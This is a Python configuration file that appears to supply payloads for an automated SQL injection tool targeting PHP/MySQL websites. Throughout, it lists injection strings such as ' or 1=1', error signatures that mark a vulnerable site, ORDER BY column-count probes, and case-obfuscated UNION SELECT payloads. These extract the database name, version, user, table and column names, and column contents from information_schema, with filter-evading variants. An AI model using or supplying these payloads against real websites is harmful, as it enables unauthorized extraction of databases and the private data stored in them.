# -*- coding: utf-8 -*-
#This is set of characters of injection in url
define_injections_chars = [
    '\'', ')', '\"', " or 1=1", " and 1=1", " and 1/2=1/3", " and 1/22=1/22",
    " or 112/32=1/123", " or 1/1=1/1", " and 'a'<>'b'", " and 2<3",
    " and 'a'='a'", " and char(32)=' '", " and 3<=2", " and 5<=>4",
    " and 5<=>5", " and 5 is null", " or 5 is not null", "%27"

] #End

#This is set of error that perhaps happen in response
define_error_list_php = [
    "You have an error in your SQL syntax;",
    "mysql_num_rows() expects parameter",
    "mysql_fetch_array() expects parameter",
    "Invalid SQL: SELECT * FROM"
] #End

#This is order by command and it bypass
define_order_by_command_php = [
    " order by 1000",
    " group by 1000"
]

#order by errors
define_error_order_by_php = [
    "column '1000' in 'order clause'"
]

#Order by in php End

#query injection in php
define_union_select_query_php = [
    " UnIon SeLeCt ",
]

define_database_detection_query_php = [
    " cOncAt(\'FINDDATABASE=>\' , dAtaBaSe(),  \'<=FINDDATABASE\')"
]

define_database_detection_query_php_bypass = [
    " ConcAt(QUOTE(2134115356), dAtaBaSe(), QUOTE(62134115356))"
]

define_version_detection_query_php = [
    " cOncAt(\'FINDVERSION=>\' , VERsion(),  \'<=FINDVERSION\')"
]

define_version_detection_query_php_bypass = [
    " cOncAt(QUOTE(2134115356) , VERsion(),  QUOTE(62134115356))"
]

define_user_detection_query_php = [
    " cOncAt(\'FINDUSER=>\' , UseR(),  \'<=FINDUSER\')"
]

define_user_detection_query_php_bypass = [
    " cOncAt(QUOTE(2134115356) , UsEr(),  QUOTE(62134115356))"
]

define_get_tables_name_query_php = [
    " CoNcaT(\'GETTABLES=>\', grOuP_conCat(TABLE_NAME), \'<=GETTABLES\')"
]

define_end_string_group_concat_query_php = [
    " FROm iNforMation_sCheMa.TabLes wHeRe tAblE_scHeMa=dATabAse()"
]

define_get_columns_of_table_query_php = [
    " CoNcaT(\'GETCOLUMNS=>\', grOuP_conCat(ColumN_NAME), \'<=GETCOLUMNS\')"
]

define_end_string_columns_of_table_query_php = [
    " FROm iNforMation_sCheMa.COLUmns wHeRe tAblE_NamE="
]

define_get_data_of_column_query_php = [
    " CoNcaT(\'GETCOLUMNSDATA=>\', grOuP_conCat(xcolumn), \'<=GETCOLUMNSDATA\')"
]

define_convert_query_php = [
    " CoNcaT(\'GETTABLES=>\', conVeRt(TABLE_NAME+uSing+lAtin1), \'<=GETTABLES\')"
]

define_end_convert_query_php = [
    " FROm iNforMation_sCheMa.TabLes wHeRe tAblE_scHeMa=dATabAse() + limit "
]

define_get_columns_of_table_convert_query_php = [
    " CoNcaT(\'GETCOLUMNS=>\', cOnVert(ColumN_NAME+uSing+lAtin1), \'<=GETCOLUMNS\')"
]

define_end_columns_of_table_convert_query_php = [
    " FROm iNforMation_sCheMa.COLUmns wHeRe tAblE_NaME="
]
